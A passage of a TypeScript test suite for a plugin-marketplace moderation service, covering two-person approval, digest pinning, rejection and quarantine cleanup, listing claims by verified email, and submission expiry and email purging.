    expect(second.request.status).toBe('approved');
    expect(h.registryPost).toHaveBeenCalledWith('/internal/plugin-publications', expect.objectContaining({
      sourceRepository: `quarantine/${id}`, digest: DIGEST_A, publisherHandle: 'community', name: 'my-linter', version: '1.0.0', tier: 'unverified', publisherOrgId: null,
    }), expect.anything());
    const community = db.tables.publishers!.find((p) => p.handle === 'community')!;
    const listing = db.tables.plugin_listings!.find((l) => l.name === 'my-linter')!;
    expect(listing).toMatchObject({ publisherId: community.id, license: 'MIT', latestVersion: '1.0.0' });
    const v = db.tables.plugin_listing_versions!.find((x) => x.listingId === listing.id)!;
    expect(v).toMatchObject({ version: '1.0.0', imageDigest: DIGEST_A, imageRepository: 'public/community/my-linter', sourcePluginId: null });
    expect(v.specSnapshot).toMatchObject({ commands: ['lint .'], smokeTest: 'lint --version', runAsRoot: false, license: 'MIT' });
    expect(row(id)).toMatchObject({ status: 'approved', listingId: listing.id, decidedBy: 'mod-2' });
    const n4 = h.notify.mock.calls.find((c: any[]) => c[0] === 'N4') as any[];
    expect(n4[1]).toEqual([{ kind: 'address', email: 'dev@example.com' }]);
    expect(n4[2].text).toContain('https://pb.example/plugins/community/my-linter');
    expect(h.audit).toHaveBeenCalledWith(expect.objectContaining({ action: 'plugin.submission.approve', actorId: 'mod-2', orgId: SYSTEM_ORG_ID }));
    expect(db.tables.plugins ?? []).toEqual([]);
    // Published: the quarantined package and build are dropped.
    expect(h.registryDelete).toHaveBeenCalledWith(`/internal/quarantine/${id}`, expect.anything());
  });

  it('fails closed when the quarantined build no longer matches the pinned digest', async () => {
    const { id, requestId } = await queued();
    row(id).gateReport = { ...row(id).gateReport, facts: { ...row(id).gateReport.facts, digest: `sha256:${'c'.repeat(64)}` } };
    await decisions.approve(moderator('mod-1') as any, requestId, null);
    await expect(decisions.secondApprove(moderator('mod-2') as any, requestId, null)).rejects.toThrow(/no longer matches/);
    expect(h.registryPost).not.toHaveBeenCalled();
    expect(db.tables.plugin_publish_requests!.find((r) => r.id === requestId)!.status).toBe('pending_second_approval');
  });

  it('claims the submission before publishing: an expiry racing the approval can no longer take it', async () => {
    const { id, requestId } = await queued();
    await decisions.approve(moderator('mod-1') as any, requestId, null);
    let seenDuringPublish: string | undefined;
    h.registryPost.mockImplementationOnce(async (_path: string, body: any) => {
      seenDuringPublish = row(id).status;
      // The expiry sweep runs mid-publish: the claimed row is not "undecided" any more.
      row(id).expiresAt = new Date(Date.now() - 1000);
      expect(await submissionsSvc.expireSubmissions()).toBe(0);
      return { statusCode: 200, body: { data: { imageRepository: `public/${body.publisherHandle}/${body.name}`, digest: body.digest } } };
    });
    await decisions.secondApprove(moderator('mod-2') as any, requestId, null);
    expect(seenDuringPublish).toBe('publishing');
    expect(row(id).status).toBe('approved');
  });

  it('hands the claim back and records nothing when the publish fails', async () => {
    const { id, requestId } = await queued();
    await decisions.approve(moderator('mod-1') as any, requestId, null);
    h.registryPost.mockImplementationOnce(async () => ({ statusCode: 502, body: { message: 'registry down' } }));
    await expect(decisions.secondApprove(moderator('mod-2') as any, requestId, null)).rejects.toThrow(/registry down|HTTP 502/);
    expect(row(id).status).toBe('pending_review');
    expect(db.tables.plugin_listings ?? []).toEqual([]);
    expect(db.tables.plugin_publish_requests!.find((r) => r.id === requestId)!.status).toBe('pending_second_approval');
  });

  it('re-runs the name gate at approval: a name reserved meanwhile is refused', async () => {
    const { requestId } = await queued();
    await decisions.approve(moderator('mod-1') as any, requestId, null);
    db.seed('ecosystem_reserved_names', { name: 'my-linter', reason: 'trademark' });
    await expect(decisions.secondApprove(moderator('mod-2') as any, requestId, null)).rejects.toMatchObject({ code: 'NAME_TAKEN' });
    expect(h.registryPost).not.toHaveBeenCalled();
  });

  it('a community listing with NO recorded owner (email purged) is taken, not open to anyone', async () => {
    const community = db.tables.publishers!.find((p) => p.handle === 'community')!;
    const l = db.seed('plugin_listings', { publisherId: community.id, name: 'my-linter', latestVersion: '0.9.0' });
    db.seed('plugin_listing_versions', { listingId: l.id, version: '0.9.0', publishedBy: 'x' });
    const res = await submit({});
    expect(res.status).toBe(409);
    expect(res.body.code).toBe('NAME_TAKEN');
  });

  it('a tenant can neither submit nor withdraw a `submission` request', async () => {
    await expect(requestsSvc.submit(tenant() as any, { kind: 'submission' })).rejects.toMatchObject({ code: 'VALIDATION_ERROR' });
  });

  it('reject → submission rejected, quarantine image dropped, N4 with the reason', async () => {
    const { id, requestId } = await queued();
    await decisions.reject(moderator('mod-1') as any, requestId, 'Looks like a miner');
    expect(row(id)).toMatchObject({ status: 'rejected', reason: 'Looks like a miner' });
    expect(h.registryDelete).toHaveBeenCalledWith(`/internal/quarantine/${id}`, expect.anything());
    const n4 = h.notify.mock.calls.find((c: any[]) => c[0] === 'N4') as any[];
    expect(n4[2].text).toContain('Looks like a miner');
    expect(h.audit).toHaveBeenCalledWith(expect.objectContaining({ action: 'plugin.submission.reject' }));
  });

  it('the console review carries the gate report, every heuristic (medium too), the SBOM/scan links and a full review diff', async () => {
    greenBuild();
    const zip = goodZip('my-linter', '1.0.0', { 'README.md': '# x\n\nNeeds AWS_SECRET_ACCESS_KEY.\n' });
    const { useZip } = greenBuild();
    useZip(zip);
    const { id } = await submitted(zip);
    await pipeline.runSubmissionGates(id);
    const requestId = db.tables.plugin_publish_requests![0]!.id;
    const detail = await consoleSvc.requestDetail(moderator('mod-1') as any, requestId);
    expect(detail.submission).toMatchObject({
      id,
      status: 'pending_review',
      newListing: true,
      sbomUrl: `/api/plugins/ecosystem/requests/${requestId}/submission-sbom`,
      scanUrl: `/api/plugins/ecosystem/requests/${requestId}/submission-scan`,
    });
    expect(detail.submission!.gateReport!.facts).toMatchObject({ digest: DIGEST_A });
    expect((detail.submission!.heuristics as any).findings).toEqual([expect.objectContaining({ id: 'credential-access', severity: 'medium' })]);
    expect(detail.review).toMatchObject({ previousVersion: null, gates: expect.any(Array), dockerfile: { current: DOCKERFILE } });
    expect((detail.review as any).metadata.find((m: any) => m.field === 'license')).toMatchObject({ value: 'MIT', source: 'spec' });
    expect(detail.request).toMatchObject({ requiresTwoPerson: true, conflictOfInterest: false });
    expect(JSON.stringify(detail)).not.toContain('example.com');
  });
});

// -----------------------------------------------------------------------------
// Claims
// -----------------------------------------------------------------------------

describe('claiming a community listing', () => {
  async function approvedListing() {
    const { id, requestId } = await queued();
    await decisions.approve(moderator('mod-1') as any, requestId, null);
    await decisions.secondApprove(moderator('mod-2') as any, requestId, null);
    return { id, listing: db.tables.plugin_listings!.find((l) => l.name === 'my-linter')! };
  }

  it('links the submissions when the claimer\'s VERIFIED email submitted them (N5, plugin.submission.claim)', async () => {
    const { id, listing } = await approvedListing();
    const claimer = { ...tenant(), email: 'dev@example.com', emailVerified: true };
    const { request } = await requestsSvc.submit(claimer as any, { kind: 'claim', target: { listingId: listing.id } });
    expect(request.payload).not.toHaveProperty('claimantEmailHash');
    const stored = db.tables.plugin_publish_requests!.find((r) => r.id === request.id)!;
    expect(stored.payload.claimantEmailHash).toMatch(/^[0-9a-f]{64}$/);
    const detail = await consoleSvc.requestDetail(moderator('mod-1') as any, request.id);
    expect(detail.claimEmailMatch).toBe(true);
    await decisions.approve(moderator('mod-1') as any, request.id, null);
    expect(row(id).status).toBe('claimed');
    expect(h.notify).toHaveBeenCalledWith('N5', [{ kind: 'user', userId: 'u-acme', orgId: 'org-acme' }], expect.anything(), expect.anything());
    expect(h.audit).toHaveBeenCalledWith(expect.objectContaining({ action: 'plugin.submission.claim' }));
  });

  it('shows "email does not match" and links nothing for another address', async () => {
    const { id, listing } = await approvedListing();
    const claimer = { ...tenant(), email: 'someone@else.com', emailVerified: true };
    const { request } = await requestsSvc.submit(claimer as any, { kind: 'claim', target: { listingId: listing.id } });
    expect((await consoleSvc.requestDetail(moderator('mod-1') as any, request.id)).claimEmailMatch).toBe(false);
    await decisions.approve(moderator('mod-1') as any, request.id, null);
    expect(row(id).status).toBe('approved');
  });

  it('never trusts an unverified account email', async () => {
    const { listing } = await approvedListing();
    const { request } = await requestsSvc.submit({ ...tenant(), email: 'dev@example.com', emailVerified: false } as any, { kind: 'claim', target: { listingId: listing.id } });
    expect((await consoleSvc.requestDetail(moderator('mod-1') as any, request.id)).claimEmailMatch).toBeNull();
  });
});

// -----------------------------------------------------------------------------
// Maintenance
// -----------------------------------------------------------------------------

describe('maintenance', () => {
  it('expires undecided submissions after 30 days, dropping their artifacts and closing their request', async () => {
    const { id: pendingVerification } = (await submit({ zip: goodZip('a1') })).body.data;
    const { id: inQueue, requestId } = await queued();
    for (const sid of [pendingVerification, inQueue]) row(sid).expiresAt = new Date(Date.now() - 1000);
    expect(await submissionsSvc.expireSubmissions()).toBe(2);
    expect(row(pendingVerification).status).toBe('expired');
    expect(row(inQueue).status).toBe('expired');
    expect(artifacts.del).toHaveBeenCalledWith(`submissions/${inQueue}.zip`, 'plugin-quarantine');
    expect(h.registryDelete).toHaveBeenCalledWith(`/internal/quarantine/${inQueue}`, expect.anything());
    expect(db.tables.plugin_publish_requests!.find((r) => r.id === requestId)!.status).toBe('rejected');
    expect(h.audit).toHaveBeenCalledWith(expect.objectContaining({ action: 'plugin.submission.expire', actorId: 'system' }));
  });

  it('purges the submitter email 90 days after the decision', async () => {
    const { id } = await submitted();
    await pipeline.failSubmissionPipeline(id, 'x');
    expect(await submissionsSvc.purgeSubmitterEmails()).toBe(0);
    row(id).emailPurgeAfter = new Date(Date.now() - 1000);
    expect(await submissionsSvc.purgeSubmitterEmails()).toBe(1);
    expect(row(id)).toMatchObject({ emailHash: null, emailEnc: null });
  });

  it('runs from the ecosystem maintenance pass', async () => {
    const { runEcosystemMaintenance } = await import('../src/services/ecosystem/maintenance.js');
    const out = await runEcosystemMaintenance();
    expect(out).toMatchObject({ submissionsExpired: 0, submitterEmailsPurged: 0 });
  });
});
